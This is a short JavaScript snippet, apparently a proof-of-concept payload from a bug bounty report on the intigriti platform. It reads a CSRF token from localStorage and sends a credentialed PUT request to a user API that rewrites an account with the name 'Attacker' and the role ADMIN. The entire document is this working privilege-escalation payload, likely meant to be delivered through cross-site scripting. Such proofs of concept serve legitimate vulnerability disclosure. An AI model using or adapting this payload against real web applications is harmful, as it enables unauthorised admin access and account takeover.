(()=>{
    const csrf = localStorage.getItem('csrfToken');
    
    fetch('/web/api2/v3/users/LcKS61MC72mHsqNCQtDXZ7', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf
        },
        body: JSON.stringify({
            firstName: "Attacker",
            lastName: "cathack",
            email: "aydilfhr+user1@intigriti.me",
            userName: "aydilfhr+user1",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    })
    .then(r => r.text())
})();
